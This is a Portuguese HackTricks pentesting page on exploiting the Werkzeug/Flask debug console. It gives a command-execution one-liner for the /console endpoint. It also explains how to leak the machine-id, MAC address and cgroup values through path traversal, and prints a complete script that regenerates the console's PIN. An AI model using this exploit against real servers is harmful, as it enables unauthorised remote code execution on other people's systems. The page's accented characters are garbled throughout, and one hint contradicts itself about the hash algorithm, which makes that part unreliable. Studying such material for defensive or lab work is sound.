# Werkzeug / Depura√ß√£o do Flask

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

[**DragonJAR Security Conference √© um evento internacional de ciberseguran√ßa**](https://www.dragonjarcon.org/) com mais de uma d√©cada que ser√° realizado nos dias 7 e 8 de setembro de 2023 em Bogot√°, Col√¥mbia. √â um evento de grande conte√∫do t√©cnico onde as √∫ltimas pesquisas em espanhol s√£o apresentadas, atraindo hackers e pesquisadores de todo o mundo.\
Registre-se agora no link abaixo e n√£o perca esta grande confer√™ncia!:

{% embed url="https://www.dragonjarcon.org" %}

## Console RCE

Se a depura√ß√£o estiver ativa, voc√™ pode tentar acessar `/console` e obter RCE.
```python
__import__('os').popen('whoami').read();
```
![](<../../.gitbook/assets/image (317).png>)

Tamb√©m existem v√°rios exploits na internet como [este](https://github.com/its-arun/Werkzeug-Debug-RCE) ou um no metasploit.

## Protegido por PIN - Traversal de Caminho

Em algumas ocasi√µes, o endpoint **`/console`** ser√° protegido por um PIN. Se voc√™ tiver uma **vulnerabilidade de travessia de arquivo**, poder√° vazar todas as informa√ß√µes necess√°rias para gerar esse PIN.

### Explora√ß√£o de PIN do Werkzeug Console

**Copiado do primeiro link.**\
Veja a mensagem "console bloqueado" do Werkzeug for√ßando a p√°gina de erro de depura√ß√£o no aplicativo.
```
The console is locked and needs to be unlocked by entering the PIN.
You can find the PIN printed out on the standard output of your
shell that runs the server
```
Localize a console Werkzeug vulner√°vel no caminho `vulnerable-site.com/console`, mas est√° bloqueada por um n√∫mero PIN secreto.

Voc√™ pode reverter o algoritmo que gera o PIN do console. Inspecte o arquivo `__init__.py` de debug do Werkzeug no servidor, por exemplo, `python3.5/site-packages/werkzeug/debug/__init__.py`. Voc√™ pode visualizar o [**reposit√≥rio de c√≥digo-fonte do Werkzeug**](https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/\_\_init\_\_.py) **para verificar como o PIN √© gerado**, mas √© melhor vazar o c√≥digo-fonte por meio de uma **vulnerabilidade de travessia de arquivo**, j√° que as vers√µes provavelmente diferem.

Vari√°veis necess√°rias para explorar o PIN do console:
```python
probably_public_bits = [
    username,
    modname,
    getattr(app, '__name__', getattr(app.__class__, '__name__')),
    getattr(mod, '__file__', None),
]

private_bits = [
    str(uuid.getnode()),
    get_machine_id(),
]
```
#### **`probably_public_bits`**

* **`username`** √© o usu√°rio que iniciou este Flask
* **`modname`** √© flask.app
* `getattr(app, '__name__', getattr (app .__ class__, '__name__'))` √© **Flask**
* `getattr(mod, '__file__', None)` √© o **caminho absoluto de `app.py`** no diret√≥rio do flask (por exemplo, `/usr/local/lib/python3.5/dist-packages/flask/app.py`). Se `app.py` n√£o funcionar, **tente `app.pyc`**

#### `private_bits`

*   `uuid.getnode()` √© o **endere√ßo MAC do computador atual**, `str(uuid.getnode())` √© a express√£o decimal do endere√ßo MAC.

    * Para **encontrar o endere√ßo MAC do servidor**, √© necess√°rio saber qual **interface de rede est√° sendo usada** para servir o aplicativo (por exemplo, `ens3`). Se desconhecido, **vaze `/proc/net/arp`** para o ID do dispositivo e, em seguida, **vaze** o endere√ßo MAC em **`/sys/class/net/<device id>/address`**.

    Converta **do endere√ßo hex para a representa√ß√£o decimal** executando em python, por exemplo:

    ```python
    # Era 56:00:02:7a:23:ac
    >>> print(0x5600027a23ac)
    94558041547692
    ```
* `get_machine_id()` concatena os **valores em `/etc/machine-id`**, **`/proc/sys/kernel/random/boot_id`** e **primeira linha de `/proc/self/cgroup`** ap√≥s a √∫ltima barra (`/`).

<details>

<summary>C√≥digo get_machine_id()</summary>
```python
def get_machine_id() -> t.Optional[t.Union[str, bytes]]:                                                                                                  
    global _machine_id

    if _machine_id is not None:
        return _machine_id

    def _generate() -> t.Optional[t.Union[str, bytes]]:
        linux = b""

        # machine-id is stable across boots, boot_id is not.
        for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id": 
            try:
                with open(filename, "rb") as f:
                    value = f.readline().strip()
            except OSError:
                continue

            if value:
                linux += value
                break

        # Containers share the same machine id, add some cgroup
        # information. This is used outside containers too but should be
        # relatively stable across boots.
        try:
            with open("/proc/self/cgroup", "rb") as f:
                linux += f.readline().strip().rpartition(b"/")[2]
        except OSError:
            pass

        if linux:
            return linux

        # On OS X, use ioreg to get the computer's serial number.
        try:
```
</details>

Depois de preparar todas as vari√°veis, execute o script de explora√ß√£o para gerar o PIN do console Werkzeug:
```python
import hashlib
from itertools import chain
probably_public_bits = [
    'web3_user',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.5/dist-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '279275995014060',# str(uuid.getnode()),  /sys/class/net/ens33/address
    'd4e6cb65d59544f3331ea0425dc555a1'# get_machine_id(), /etc/machine-id
]

#h = hashlib.md5() # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```
{% hint style="success" %}
Se voc√™ estiver em uma **vers√£o antiga** do Werkzeug, tente mudar o **algoritmo de hash para md5** em vez de md5.
{% endhint %}

## Refer√™ncias

* [**https://www.daehee.com/werkzeug-console-pin-exploit/**](https://www.daehee.com/werkzeug-console-pin-exploit/)
* [**https://ctftime.org/writeup/17955**](https://ctftime.org/writeup/17955)

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

[**A Confer√™ncia de Seguran√ßa DragonJAR √© um evento internacional de ciberseguran√ßa**](https://www.dragonjarcon.org/) com mais de uma d√©cada que ser√° realizada em **7 e 8 de setembro de 2023** em Bogot√°, Col√¥mbia. √â um evento de grande conte√∫do t√©cnico onde as √∫ltimas pesquisas em espanhol s√£o apresentadas, atraindo hackers e pesquisadores de todo o mundo.\
Registre-se agora no seguinte link e n√£o perca esta grande confer√™ncia!:

{% embed url="https://www.dragonjarcon.org" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
